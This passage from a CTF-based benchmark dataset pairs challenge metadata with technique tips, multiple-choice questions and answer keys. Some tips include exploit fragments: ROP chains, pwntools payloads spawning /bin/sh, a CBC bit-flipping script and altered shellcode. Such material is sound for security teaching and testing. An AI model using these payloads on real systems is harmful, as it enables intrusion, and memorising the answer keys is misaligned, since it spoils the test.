            "When analyzing binary challenges that include random number generation, if a static seed is used with functions like `srand()`, the sequence of numbers generated by subsequent calls to `rand()` can be predicted and replicated. This allows for reverse-engineering the logic or values expected by the binary, especially if the binary's behavior depends on this predictable sequence. To leverage this, recreate the random sequence generation logic in a separate program, using the same seed, to predict or understand the expected values. This approach can be fundamental in solving challenges that rely on deterministic outputs from pseudo-random functions.\n\n    Example in pseudo-code based on the challenge:\n    ```c\n    srand(static_seed);\n    predictable_number = rand();\n    ```",
            "For reverse-engineering challenges where the goal is to calculate or deduce a specific input (`param_1` in this case) that leads to a desired outcome (e.g., authentication bypass, flag disclosure), analyze the conditions involving this input in the disassembled or decompiled code. Then, replicate the logic in a custom script or program, manipulating the equation if necessary, to solve for the unknown input. This method is particularly effective for challenges where the input is processed in a predictable or reversible manner.\n\n    Example approach derived from the challenge:\n    ```c\n    // Given: uVar1, uVar2, and a target XOR value (0x3597b741)\n    // Solve for x (the original input param_1)\n    x = uVar2 ^ uVar1 ^ 0x3597b741;\n    ```"
        ],
        "question": [
            "Regarding the use of the `srand()` function in programming challenges to generate a predictable sequence of numbers, which of the following statements is true? - A. Changing the seed value in each execution makes the `rand()` function produce a more secure and unpredictable sequence of numbers. - B. Using a constant seed value in `srand()` leads to the generation of an unpredictable sequence of numbers, enhancing the security of the program. - C. Utilizing the `srand()` function without specifying a seed value ensures that the sequence generated by `rand()` is predictable and repeatable across different program executions. - D. Setting a static seed in `srand()` ensures that the sequence generated by subsequent calls to `rand()` is predictable and can be replicated in separate programs for analysis or reverse-engineering purposes. ",
            "In solving reverse-engineering challenges where you need to deduce a specific input based on the target program's logic, which approach is most effective? - A. Altering the executable binary directly to bypass the need for specific input calculations. - B. Ignoring the logical conditions and focusing solely on brute-forcing all possible input values until the desired outcome is achieved. - C. Replicating the logic from the disassembled or decompiled code in a custom program, and solving for the unknown input based on the given conditions and operations (e.g., XOR values). - D. Modifying the target program's runtime environment to intercept and modify function calls, such as `rand()`, to force the program to accept any input as valid. "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "WEIRD ENCRYPTION",
        "write_up": "dataset/raw/WEIRD ENCRYPTION.md",
        "type": "crypto",
        "competition": [
            "DarkCTF/2020",
            "https://ctftime.org/event/1118/tasks/"
        ],
        "score": 377,
        "max_score": 499,
        "difficulty": 0.7555110220440882,
        "knowledge": [
            "In challenges involving custom encryption methods where ciphertext characters correspond to values derived from their positions within a specific string or array (denoted here as `main_string`), one can decrypt the message by reversing the process. This involves determining the original indexes used in the encryption process, then applying arithmetic operations to convert these indexes back to ASCII values, thus revealing the plaintext. This method is applicable whenever the encryption involves simple mathematical operations based on index values within a predefined string or array.\n\nExample payload/template (adjusted based on the specifics of the challenge):\n```python\nwith open(\"Encrypted_File_Path\", \"r\") as file:  \n    ciphertext = file.read().replace(\"\\n\", \"\")\n\nmain_string=\"predefined_string_or_array_used_in_encryption\".split()\nascii_values = []  \nplaintext_chars = []  \n\n# Convert ciphertext into index values or a similar intermediary format\n# Note: The conversion logic will vary based on the encryption details\nfor char in ciphertext:\n    # Assuming a simplified example where each char directly maps to an index\n    index = main_string.index(char)  \n    ascii_values.append(index)\n\n# Convert intermediary format (e.g., index values) back to ASCII values then to characters\nfor index in ascii_values:\n    # Assuming a simple arithmetic relationship for demonstration\n    ascii_value = some_arithmetic_operation(index)  \n    plaintext_chars.append(chr(ascii_value))  \n\nplaintext = ''.join(plaintext_chars)\nprint(plaintext)\n```",
            "When the encryption method uses a divisor and operates by dividing ASCII values into quotient and remainder pairs, the decryption process can effectively reverse this by multiplying each quotient by the divisor and adding the remainder to reconstruct each character's ASCII value. This strategy is effective in scenarios where encryption algorithms break down ASCII representations of characters into smaller, arithmetic components (e.g., quotient and remainder from division) before encoding them.\n\nExample payload/template for decryption:\n```python\n# Assuming divisor, quotients, and remainders are already defined or extracted\ndivisor = 16  # This value could change based on the encryption specifics\ndecrypted_chars = []\n\nfor i in range(0, len(encoded_indexes), 2):  # encoded_indexes stores quotient and remainder pairs\n    ascii_val = divisor * encoded_indexes[i] + encoded_indexes[i+1]\n    decrypted_chars.append(chr(ascii_val))\n\ndecrypted_text = ''.join(decrypted_chars)\nprint(decrypted_text)\n```"
        ],
        "question": [
            "In a scenario where you are provided with a custom encryption scheme that maps each character of the plaintext to positions within a predefined string or array, and these index positions are directly utilized in generating ciphertext, which Python function is crucial to reverse the encryption process by finding a character's original index in the predefined string or array?  - A. `.find()` - B. `.index()` - C. `.position()` - D. `.locate()` ",
            "When faced with a ciphertext encrypted through a process where each character's ASCII value is divided into a quotient and remainder, and given the quotient and remainder for each encrypted character along with a known divisor of 16, which of the following best describes the method to decrypt and recover the original plaintext character?  - A. Multiply each quotient by 16 and add it to its corresponding remainder, then convert the result from ASCII value to character. - B. Sum the quotient and remainder then multiply by 16 to find the ASCII value, converting that value to a character. - C. Divide the remainder by the quotient, then subtract from 16 to find the ASCII value, and convert that value to a character. - D. Multiply the remainder by the quotient, ignoring the divisor, to find the ASCII value, and convert that value to a character. "
        ],
        "answer": [
            "B",
            "A"
        ]
    },
    {
        "name": "Weird Message",
        "write_up": "dataset/raw/Weird Message.md",
        "type": "crypto",
        "competition": [
            "angstrom/2018",
            "https://ctftime.org/event/577/tasks/"
        ],
        "score": 100,
        "max_score": 250,
        "difficulty": 0.4,
        "knowledge": [
            "When dealing with punycode encoded data in a CTF challenge, one method to decode is to first attempt decoding using the 'punycode' codec. If homoglyphs (characters that look similar to ASCII characters but have different unicode values) are present, they should be identified and replaced with their ASCII equivalents before final decoding. This approach is effective in challenges where visual deception is used to disguise data. For example, a mapping can be created to replace the homoglyphs '\u042c\u0430\u0435\u043e\u0440\u0441\u0443\u0445\u0455\u0456\u0458\u0461\u0475\u04bb' with their ASCII lookalikes 'baeopcyxsijwvh'.",
            "If a long and complex string is provided in a cryptographic challenge, and standard decoding methods return data containing non-ASCII characters or hints towards specific encoding schemes (like punycode), consider the presence of encoded messages that require iterative decoding. This means repeatedly decoding the data until a readable format is achieved or until all encoding layers (indicated by specific delimiters or character patterns such as '-') are removed. This method applies in scenarios where data is heavily obscured through multiple layers of encoding or representation changes."
        ],
        "question": [
            "In a cybersecurity challenge that involves decoding punycode encoded data which includes homoglyphs, what is the correct approach to handle characters that look similar to ASCII characters but have different unicode values? - A. Encode the data using Base64 before any operation. - B. Immediately translate the data to ASCII without assessing for homoglyphs. - C. Identify and replace the homoglyphs with their ASCII equivalents before final decoding. - D. Use a direct ASCII to utf-8 conversion on the data without manipulation.",
            "When confronted with a long and complex string in a cryptographic challenge that, upon standard decoding methods, reveals non-ASCII characters or indicates a specific encoding scheme (like punycode), which step is considered effective for eventually reaching a readable format? - A. Convert the complex string into hexadecimal and analyze the pattern. - B. Consider the string as a direct message without further decoding steps. - C. Apply an SHA-256 hash on the string to simplify its complexity before decoding. - D. Iteratively decode the data until a readable format is achieved or until all encoding layers are removed."
        ],
        "answer": [
            "C.",
            "D."
        ]
    },
    {
        "name": "weird-rop",
        "write_up": "dataset/raw/weird-rop.md",
        "type": "reverse",
        "competition": [
            "CircleCityCon/2021",
            "https://ctftime.org/event/1350/tasks/"
        ],
        "score": 278,
        "max_score": 299,
        "difficulty": 0.9297658862876255,
        "knowledge": [
            "In challenges involving Return Oriented Programming (ROP), especially when dealing with limited or \"yucky\" gadgets that do not directly suit the needs of manipulation or system call invocation, XOR gadgets can be repurposed to set specific register values. This technique can be particularly useful when needed to adjust register values to perform system calls indirectly by manipulating the register's value through XOR operations with immediate values. This action requires computing or brute-forcing the sequence of XOR operations to achieve the desired register state. For exploitation, one might write a script to automate the search for the correct combination of XOR gadgets to set a specific register to the required value.\n\n    - Condition: When direct gadgets are unavailable or insufficient to achieve a desired register state for syscall arguments.\n    - Knowledge: Use XOR gadgets in combination by brute-forcing or calculating the necessary immediate values to XOR with, achieving a required value in a register. This method compensates for the absence of direct gadgets to set register values.",
            "When exploiting buffer overflows or similar vulnerabilities in statically compiled binaries, it is crucial to create a ROP chain that interacts with system calls directly due to the absence of libc. For reading and writing operations, understanding the ABI (Application Binary Interface) and syscall numbers for `read` and `write` operations provides the ability to manipulate file descriptors and buffer addresses to read a file (like a flag file) and write its contents to standard output. Additionally, knowing how file descriptors are represented and manipulated in a program lets attackers craft precise ROP chains to leak information or redirect output.\n\n    - Condition: Applicable in scenarios involving buffer overflows in statically compiled binaries where direct system call invocation is needed.\n    - Knowledge: Construct a ROP chain using direct system call invocations with appropriate syscall numbers and manipulate file descriptors along with buffer addresses to perform read/write operations without relying on libc functions.\n\n```C\nuint8_t exploit[EXPLOIT_LEN] = {\n    // [Filler bytes adjusted for stack alignment and buffer offset]\n    // XOR gadgets to manipulate 'rdi' for file descriptor\n    0x7c, 0x10, 0x40, 0x00, // xor rdi, 0x53; Address adjusted for example\n    0x1a, 0x10, 0x40, 0x00, // xor rdi, 0x56; Address adjusted for example\n    // Gadget to set 'rdx' register for length of read/write\n    0xde, 0x10, 0x40, 0x00, // pop rdx; Address adjusted for example\n    0x19, 0x00, 0x00, 0x00, // [Value for 'rdx']\n    // System call gadgets for read and write operations\n    0x02, 0x10, 0x40, 0x00, // mov rax, 0x0 (syscall number for read)\n    0xdb, 0x10, 0x40, 0x00, // syscall\n    0x0a, 0x10, 0x40, 0x00, // mov rax, 0x1 (syscall number for write)\n    0x12, 0x10, 0x40, 0x00, // mov rdi, 0x1 (stdout file descriptor)\n    0xdb, 0x10, 0x40, 0x00, // syscall\n};\n```"
        ],
        "question": [
            "When specifically tasked with setting the `rdi` register to a value of `5` for a syscall in an ROP chain without a direct gadget available, which of the following XOR gadget sequences could be used to achieve this goal, assuming `rdi` is initially zero?  - A. Use a single XOR gadget to XOR `rdi` with `5` directly. - B. Apply two XOR gadgets sequentially; first XOR `rdi` with `0x53`, then with `0x56`. - C. Apply a sequence of multiple XOR gadgets that indirectly result in `rdi` being set to `5` after several XOR operations. - D. XOR `rdi` with itself to achieve any desired value. ",
            "When constructing a ROP chain for a statically compiled binary to perform reading from and writing to a file without libc, which of the following steps correctly outlines the use of system call numbers within the chain?  - A. Place syscall number for `open` in `rax`, followed by the file descriptor for `stdin` in `rdi`, then perform the syscall. - B. Insert the address of the string to be written directly into `rax` followed by a call to `write` syscall without setting `rdi` or `rsi`. - C. Set `rax` to `0` for the `read` syscall, followed by adjusting `rdi` to the file descriptor, set `rsi` to the buffer address, and `rdx` to the length before calling syscall; repeat a similar process for `write` with `rax` set to `1`. - D. Manipulate `rdi` to contain the syscall number for `read`, then directly execute a `write` syscall without adjusting `rax`. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Welcome Pwner",
        "write_up": "dataset/raw/Welcome Pwner.md",
        "type": "pwn",
        "competition": [
            "FwordCTF/2020",
            "https://ctftime.org/event/1066/tasks/"
        ],
        "score": 374,
        "max_score": 500,
        "difficulty": 0.748,
        "knowledge": [
            "When dealing with a Buffer Overflow (BOF) vulnerability on systems with protections like NX and PIE enabled but lacking a stack canary, a Return-Oriented Programming (ROP) approach can be utilized to execute arbitrary code. This is facilitated by the leakage of a system function's address, which when combined with the right version of libc, allows for the determination of the base address of libc in memory. This base address can be used to calculate the addresses of other libc functions and gadgets needed for ROP chains.\n   \n   Example scenario: If a program leaks the address of the `system` function and the input is received via an insecure function like `gets`, which does not check the bounds of the input buffer, this setup can be exploited by first finding the correct libc version using tools like the libc-database. With the correct libc version, calculating the offset to the `system` function allows for crafting a payload that includes the `system` function's address to execute `/bin/sh`, granting shell access.",
            "When the libc version is not known a priori in a remote exploitation scenario, the libc-database can be employed to identify the version of libc used by the remote system. This is achieved by leaking an address of a libc function (e.g., `system`) and searching for the last few nibbles of this address using the `./find` command provided by the libc-database. Once the libc version is identified, the associated libc binary can be downloaded and used locally to calculate offsets for ROP chains accurately.\n\n   Example scenario: To exploit a remote service that leaks the address of `system`, connect to the service to get the leaked address. Use the address with libc-database's `./find` utility, narrowing the search with architecture specifics (e.g., i386). Once the correct libc version is identified and downloaded, calculate the base address of libc from the leaked `system` address to craft a ROP chain or to call `system(\"/bin/sh\")` for shell access.\n\n   Sample of payload construction with Python's `pwntools`:\n   ```python\n   payload  = 0x20 * b'A'\n   payload += p32(libc.sym.system)\n   payload += 4 * b'B'\n   payload += p32(libc.search(b'/bin/sh').__next__())\n   ```"
        ],
        "question": [
            "In a challenge involving a buffer overflow vulnerability where the address of the `system` function is leaked, how can the base address of libc be calculated for use in a Return-Oriented Programming (ROP) chain? - A. Subtract the leaked `system` address from the start address of the binary. - B. Add the leaked `system` address to the offset of `/bin/sh` in libc. - C. Subtract the offset of `system` in libc from the leaked `system` address. - D. Add the leaked `system` address to the offset of `system` in libc. ",
            "When attempting to identify the version of libc used by a remote server that leaks the address of the `system` function, what is the correct way to utilize the libc-database for finding the appropriate version? - A. Use the full leaked `system` address with `./find` to download all versions of libc and test each one. - B. Subtract the leaked `system` address from your local libc `system` address and use `./find` with the result. - C. Take the last 3 nibbles of the leaked `system` address and pass them to `./find`, optionally specifying the architecture. - D. Convert the leaked `system` address to ASCII and search the libc-database with the resulting string. "
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "Welcome To Pwn",
        "write_up": "dataset/raw/Welcome To Pwn.md",
        "type": "pwn",
        "competition": [
            "boot2root/2020",
            "https://ctftime.org/event/1202/tasks/"
        ],
        "score": 457,
        "max_score": 496,
        "difficulty": 0.9213709677419355,
        "knowledge": [
            "When attempting to exploit buffer overflow vulnerabilities to gain shell access, it's crucial to form a ROP (Return-Oriented Programming) chain that includes both a 'ret' gadget and the address of a function (e.g., `get_shell`) to successfully redirect execution flow. This technique can be particularly useful when direct jumps to desired functions are mitigated by security measures. Example payload construction includes padding (`\"A\"*152` in this case to overflow the buffer), followed by the address of `ret` to stabilize the stack, and then the address of the `get_shell` function or similar to gain control.  \nExample payload snippet: `payload = b\"A\"*152+p64(ret)+p64(get_shell)`",
            "Utilizing Python along with the `pwntools` library can significantly streamline the development of exploits for binary exploitation challenges. The `ELF` module from `pwntools` can be used to automate the extraction of function addresses (such as `get_shell` in the write-up) from binaries. This approach facilitates crafting precise payloads without manually digging through disassembled code. Additionally, `pwntools` supports both local and remote exploitation through its `process` and `remote` functions, enabling seamless transition from testing to actual exploitation against a challenge server.  \nNo example payload for this point as it is more about the approach and automation."
        ],
        "question": [
            "In the context of exploiting a buffer overflow vulnerability to execute arbitrary code via a ROP chain, if you need to ensure the stack is properly aligned before jumping to a function's address (e.g., `get_shell`) to prevent potential issues such as misalignment errors, which of the following would correctly describe the purpose of inserting a 'ret' gadget address before the `get_shell` function address in the payload? - A. To insert a no-operation (NOP) slide for creating a larger target for the overflow. - B. To circumvent address space layout randomization (ASLR) by guessing the correct address. - C. To ensure proper stack alignment and facilitate a smooth transition to the `get_shell` function. - D. To extend the size of the buffer to hold more ROP gadgets. ",
            "When developing an exploit for a binary exploitation challenge, particularly focusing on buffer overflow vulnerabilities, why might an attacker benefit from using the `pwntools` library's `ELF` module in combination with Python scripting? - A. The `ELF` module automatically patches the binary to prevent it from executing unwanted functions. - B. It allows for direct modification of the executable's source code to introduce vulnerabilities. - C. The `ELF` module is used to brute-force the addresses of functions and gadgets within the binary. - D. It eases the extraction of function addresses such as `get_shell` from the binary for precise payload crafting. "
        ],
        "answer": [
            "C.",
            "D."
        ]
    },
    {
        "name": "WelcomeCrypto",
        "write_up": "dataset/raw/WelcomeCrypto.md",
        "type": "crypto",
        "competition": [
            "Sunshine/2019",
            "https://ctftime.org/event/767/tasks/"
        ],
        "score": 50,
        "max_score": 350,
        "difficulty": 0.14285714285714285,
        "knowledge": [
            "For challenges presenting ciphertext with an unfamiliar pattern or appearance, consider trying well-known, simple cipher techniques if the ciphertext structure hints at their applicability. Specifically, when dealing with ROT-based ciphers, use online decoder tools to efficiently decipher hidden messages. If decryption results in a partially decoded message, applying another layer of simple cipher (like ROT13) might be necessary to reveal the full plaintext. Example payload for ROT47 followed by ROT13 if needed: Use an online ROT47 tool, then apply ROT13 decoder on any nonsensical output.",
            "In audio-based CTF challenges where a series of words are provided, particularly if they resemble elements of the NATO Phonetic Alphabet, convert the spoken words to their corresponding first letters to form a string. This resultant string may need further decryption, potentially through a simple cipher like Caesar Cipher indicated by a numeric clue within the challenge itself. Always remember to check the challenge description or any audio-transcribed content for numerical clues that suggest the type of cipher or the shift/key required for decryption. Example decoding process: Transcribe audio to letters using NATO Phonetic Alphabet \u2192 Decode using Caesar Cipher shift indicated by a clue (`6`)."
        ],
        "question": [
            "In a CTF challenge where you're given `~C8 =39 A?2V8 73J:C 8FG7 AF?JJC2ECP` and told to use a ROT47 cipher, which further operation might you need to apply if the output includes nonsensical or partially deciphered text? - A. Apply a Caesar Cipher with a random shift - B. Re-encode the output using Base64 - C. No further operations are required as ROT47 should solve it - D. Use a ROT13 decoder on the ROT47 output",
            "When attempting to decrypt an audio message that translates to \"Hotel Kilo Charlie Golf Xray Kilo Zulu November Kilo Oscar Juliette Kilo Yankee Uniform Lima Sierra Golf Xray India November\" and you are hinted at utilizing a numeric clue '6', which cipher operation is most appropriate for decoding the message post transcription using the NATO Phonetic Alphabet? - A. Use a Polybius Square with the grid size determined by '6' - B. Decode using a Caesar Cipher with a shift of 6 - C. Apply a Vigen\u00e8re Cipher using '6' as the key - D. Execute an XOR operation with the key set to '6'"
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "Well Known",
        "write_up": "dataset/raw/Well Known.md",
        "type": "web",
        "competition": [
            "HexionCTF/2020",
            "https://ctftime.org/event/1014/tasks/"
        ],
        "score": 100,
        "max_score": 998,
        "difficulty": 0.10020040080160321,
        "knowledge": [
            "When dealing with HTTP(S) URIs in CTF challenges where a 404 error is encountered, and the challenge implies or hints towards well-known locations, leverage RFC8615 which specifies a path prefix \"/.well-known/\" for well-known locations. Utilizing a list of known services from the \"/.well-known/\" directory can uncover hidden directories or files that are not directly linked from the website. This approach can be applied universally across any web challenges suggesting hidden paths. Example payload snippet: `/path/to/script.py` iterating over a list like `[\"security.txt\", \"acme-challenge\", ...]`.",
            "In challenges hinting at standards or protocols (like RFCs), researching the standard can provide direct clues or methodologies on how to approach the challenge. Specifically, for web-related challenges hinting at well-known paths or services, referring to resources like RFC8615 or curated lists (e.g., Wikipedia's list of well-known services) can guide the strategy for directory or file discovery to uncover hidden flags. This approach is universally applicable where the challenge provides oblique references to standards or protocols without explicit directions."
        ],
        "question": [
            "When encountering a 404 error on a website during a CTF challenge, and the challenge hints at exploring well-known locations, which of the following Python snippets correctly iterates over a list of well-known URIs to find hidden directories or files? - A. ```python urls = [\"/.well-known/security.txt\", \"/.well-known/acme-challenge\"] for url in urls: response = requests.post(\"https://targetsite.com\" + url) if response.status_code == 200: print(url) ``` - B. ```python well_known_uris = [\"security.txt\", \"acme-challenge\"] for uri in well_known_uris: print(f\"https://targetsite.com/.well-known/{uri}\") ``` - C. ```python well_known_uris = [\"security.txt\", \"acme-challenge\"] for uri in well_known_uris: response = requests.get(f\"https://targetsite.com/.well-known/{uri}\") if response.status_code != 404: print(uri) ``` - D. ```python well_known_uris = [\"security.txt\", \"acme-challenge\"] for uri in well_known_uris: response = requests.get(f\"http://targetsite.com/{uri}\") if response.status_code == 200: print(uri) ```",
            "In the context of web-related CTF challenges that hint at utilizing well-known paths or services, which approach should be used to uncover hidden content based on references to standards or protocols? - A. Manually check each page linked from the website's homepage for hidden flags or content. - B. Ignore the hints and randomly guess the path to hidden files or directories. - C. Utilize resources like RFC8615 or Wikipedia's list of well-known services to methodically search for hidden directories or files. - D. Focus solely on exploiting common web vulnerabilities without considering any standard or protocol clues."
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "What the Flip_!",
        "write_up": "dataset/raw/What the Flip_!.md",
        "type": "crypto",
        "competition": [
            "DawgCTF/2021",
            "https://ctftime.org/event/1319/tasks/"
        ],
        "score": -1.0,
        "max_score": 400,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving CBC mode encryption vulnerabilities, Bit (or Byte) Flipping attacks can be utilized to modify characters in the plaintext by altering the ciphertext in the relevant block. This is especially useful in scenarios where the goal is to change specific characters to meet certain conditions (like altering user permissions or bypassing authentication checks). To execute a successful attack, one must understand the position of the target character in the plaintext, the block size, and the XOR operation's properties. This knowledge allows for the calculation of the modified ciphertext byte that, when decrypted, will result in the desired plaintext alteration.\nExample payload modification step: calculate `dec = original_byte XOR original_char`, then `modified_byte = dec XOR desired_char`.",
            "To automate the exploitation of a Bit Flipping attack in a CTF challenge, Python scripts can be highly effective. Libraries like `pwn` can facilitate interaction with the challenge server, allowing for sending crafted inputs and receiving outputs. The key steps involve leaking the original ciphertext, calculating the modified byte to produce the desired plaintext change, and then constructing and sending the new ciphertext to achieve the objective (e.g., bypassing authentication). Understanding the hexadecimal representation of characters and the CBC decryption process is crucial for calculating the correct value to inject.\nExample Python script excerpt for automated exploitation: \n```python\nfrom pwn import *\n\np = remote(\"challenge.server.com\", 3000)\n# Interaction with the challenge to get the leaked ciphertext\nleaked_ciphertext = \"example_leaked_ciphertext\"\n# Calculation to modify a specific character in the plaintext\ndec = int(leaked_ciphertext[:2], 16) ^ ord('original_char')\nmodified_byte = hex(dec ^ ord('new_char'))\nnew_ciphertext = modified_byte[2:] + leaked_ciphertext[2:]\np.sendline(new_ciphertext)\n```"
        ],
        "question": [
            "In a cryptographic challenge involving CBC mode, where the goal is to alter a specific character within the plaintext through a Bit (or Byte) Flipping attack, given an original ciphertext byte value of 0x43 (representing character 'b'), what would be the correct calculation to modify this byte so that, when decrypted, the 'b' becomes an 'a' (0x61 in hexadecimal), assuming the XOR operation is legal and commutative? - A. `decrypted_byte = 0x43 XOR 0x61` - B. `modified_byte = (0x43 XOR 0x62) XOR 0x61` - C. `modified_byte = (0x61 XOR 0x43) XOR 0x62` - D. `decrypted_byte = 0x61 XOR 0x62`",
            "When automating a Bit Flipping attack for a CTF challenge using Python, which step correctly describes how to prepare the new ciphertext to send back to the server, if the goal is to change the plaintext character 'b' to 'a' using the leaked ciphertext \"6e4fd3f004fe5093b2c12c96295ffa9e\", and the 'b' is represented by the first byte of the second block? - A. `new_ciph = '61' + leaked[2:]` - B. `new_ciph = enc_a[2:] + leaked[2:]` after calculating `enc_a` as the XOR of the desired character and its position. - C. `new_ciphertext = modified_byte + leaked_ciphertext[3:]` after calculating the modified byte based on the byte value and desired change. - D. `new_ciph = leaked[:2] + '61' + leaked[4:]`"
        ],
        "answer": [
            "B.",
            "B."
        ]
    },
    {
        "name": "Whats_A_Syscall_",
        "write_up": "dataset/raw/Whats_A_Syscall_.md",
        "type": "pwn",
        "competition": [
            "UIUCTF/2020",
            "https://ctftime.org/event/1075/tasks/"
        ],
        "score": -1.0,
        "max_score": 666,
        "difficulty": -1,
        "knowledge": [
            "When dealing with CTF challenges that require invoking a specific syscall to alter program behavior or escape a sandbox environment, the required syscall number can be directly modified in provided or example shellcode. This approach is applicable when the environment or challenge hints towards the usefulness of a particular syscall not originally present in the example code. To adapt shellcode for a different syscall, locate the portion of the hex-encoded shellcode corresponding to the syscall number and substitute it with the hexadecimal representation of the desired syscall number. For instance, to change an example shellcode invoking syscall 6 (SYS_ALERT) to invoke syscall 14 (SANDBOX_SPECIAL), replace the hex code '06' with '0e'. Example modified shellcode segment: `b8 a0 c0 04 08 8d 1d 15 00 00 00 01 c3 b8 0e 00 00 00 cd 80 c3`.",
            "In scenarios requiring the input of shellcode or other data into a virtual machine (VM) or restricted environment as part of a CTF challenge, AutoHotKey (AHK) scripts can be employed to automate the input process. This is particularly useful when manual entry is impractical due to the volume of data or when the input needs to be formatted in a specific way that is tedious to accomplish manually. Developing an AHK script enables participants to efficiently and accurately deliver payloads without direct interaction, streamlining the challenge-solving process."
        ],
        "question": [
            "In a cybersecurity CTF challenge requiring the modification of shellcode to invoke a specific syscall, which segment of the following example shellcode should be changed to invoke syscall 14 instead of syscall 6?  Example shellcode:  `b8 a0 c0 04 08 8d 1d 15 00 00 00 01 c3 b8 06 00 00 00 cd 80 c3`  - A. Replace `b8 a0` with `0e a0` - B. Replace `cd 80` with `cd 0e` - C. Replace `06` with `0e` - D. Replace `01 c3` with `0e c3` ",
            "When faced with the challenge of inputting large amounts of shellcode into a VM for a CTF competition, which tool is best suited to automate the input process, making it both efficient and accurate?  - A. Python scripting with PyAutoGUI - B. Manual entry using copy and paste - C. Developing an AutoHotKey (AHK) script - D. Using a batch file "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "what_r_the_noise",
        "write_up": "dataset/raw/what_r_the_noise.md",
        "type": "pwn",
        "competition": [
            "GACTF/2020",
            "https://ctftime.org/event/1115/tasks/"
        ],
        "score": 273,
        "max_score": 625,
        "difficulty": 0.4368,
        "knowledge": [
            "When working with challenges involving network connections (such as interacting with remote services using `nc`), and you encounter data that seems nonsensical or \"encrypted\", consider the possibility of encoded information. In this scenario, the encoded data may represent ASCII values of characters. Attempt to convert these values to their character equivalents using Python. An efficient way to do this is by rounding the values to the nearest whole number and converting them to characters using the `chr()` function within a list comprehension. \n   - Example processing in Python: \n     ```python\n     data = [101.675707, 108.104373, ...]  # Sample data received\n     decoded_message = [chr(int(round(i))) for i in data]\n     print(''.join(decoded_message))\n     ```",
            "In scenarios where the received data appears to involve noise or randomness that may affect the decoding accuracy, a method of data normalization can be used to filter out this noise. The provided approach involves collecting multiple datasets over the same connection (or similar conditions), summing corresponding values across these datasets, and then averaging them before applying the decoding process. This technique is useful for mitigating the effect of random noise on data, particularly in challenges where data transmission is intentionally obfuscated or subjected to interference.\n   - Example of noise reduction and data averaging in Python:\n     ```python\n     from pwn import *\n\n     def readData():\n         p.sendlineafter(\":\", \"2\", timeout=3)\n         ret = p.recvuntil(\"\\n\", timeout=1)\n         ret = ret.replace(\",\\n\", \"\")\n         return eval(\"[\" + ret + \"]\")\n\n     MAX_C = 1000\n     buf = readData()\n     L = len(buf)\n     C = 1\n     for k in range(MAX_C):\n         a = readData()\n         if len(a) != L:\n             continue\n         C += 1\n         for i in range(L):\n             buf[i] += a[i]\n     \n     for i in range(L):\n         buf[i] = int(round(buf[i] / C))\n\n     decoded_message = [chr(i) for i in buf]\n     print(\"\".join(decoded_message))\n     ```"
        ],
        "question": [
            "When decoding encoded ASCII values in a cybersecurity challenge after receiving seemingly nonsensical data over a network connection, which Python code snippet correctly demonstrates how to decode this data into a readable message? - A. decoded_message = ''.join([str(i) for i in data]) - B. decoded_message = [i for i in data if int(i)] - C. decoded_message = ''.join(map(chr, data)) - D. decoded_message = ''.join([chr(int(round(i))) for i in data])",
            "In a challenge involving data transmission with potential noise interference, which Python code snippet accurately represents a method for normalizing the data by averaging values across multiple datasets to improve the decoding accuracy? - A. for i in range(L): buf[i] = sum(buf[i]) / len(buf) - B. for i in range(L): buf[i] = int(round(buf[i] / C)) - C. for k in range(MAX_C): if len(a) == L: for i in range(L): buf[i] /= C - D. buf = [sum(col) / len(col) for col in zip(*data)]"
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "Who Can Haz Flag",
        "write_up": "dataset/raw/Who Can Haz Flag.md",
        "type": "The type of this challenge is **forensics**.",
        "competition": [
            "DanteCTF/2023",
            "https://ctftime.org/event/2000/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "When analyzing network traffic in Wireshark for CTF challenges, particularly when the challenge hints suggest protocols like ARP or DNS, it is beneficial to sort the packets by protocol. This approach aids in focusing on relevant packets that may contain hidden or obfuscated data related to the flag. By concentrating on these protocols, one can unveil patterns or anomalies that are instrumental in puzzle resolution.",
            "In challenges involving packet captures (PCAPs) where data might be hidden or encoded within packet fields, a methodical examination of specific parts of the packets, such as the last character in the hexdump of ARP requests, can reveal hidden messages or flags. This tactic of extracting data from non-standard fields or components of packets underscores the importance of a detailed and creative analysis of packet captures, beyond the conventional examination of packet payloads or headers. \n\nExample extraction strategy from an ARP request hexdump: Collect the last character of each relevant packet's hexdump, in sequence, to form a string that may represent the flag or a part of it."
        ],
        "question": [
            "When investigating a CTF challenge involving network traffic analysis, which protocol sorting strategy in Wireshark might help focus on relevant packets where a flag could be hidden, especially when hints point towards the use of ARP or DNS protocols? - A. Sort by the packet length, focusing on unusually large or small packets. - B. Sort by protocol, allowing a detailed review of specific protocols like ARP or DNS. - C. Sort by source or destination IP to find packets only from specific addresses. - D. Sort packets by timestamp to see the first and last packets of the capture.",
            "In a CTF challenge where the flag is suspected to be hidden within packet fields, what method can be used to systematically uncover this flag in ARP request packets? - A. Compare the time-to-live (TTL) values of sequential ARP packets to find a pattern. - B. Collect and concatenate the source IP addresses from each ARP request to decode the flag. - C. Extract the last character from the hexdump of each ARP request, in sequence, to construct the flag. - D. Analyze the MAC address field of ARP packets for encoded ASCII characters that spell out the flag."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Who drew on my program_",
        "write_up": "dataset/raw/Who drew on my program_.md",
        "type": "crypto",
        "competition": [
            "RITSEC/2018",
            "https://ctftime.org/event/682/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
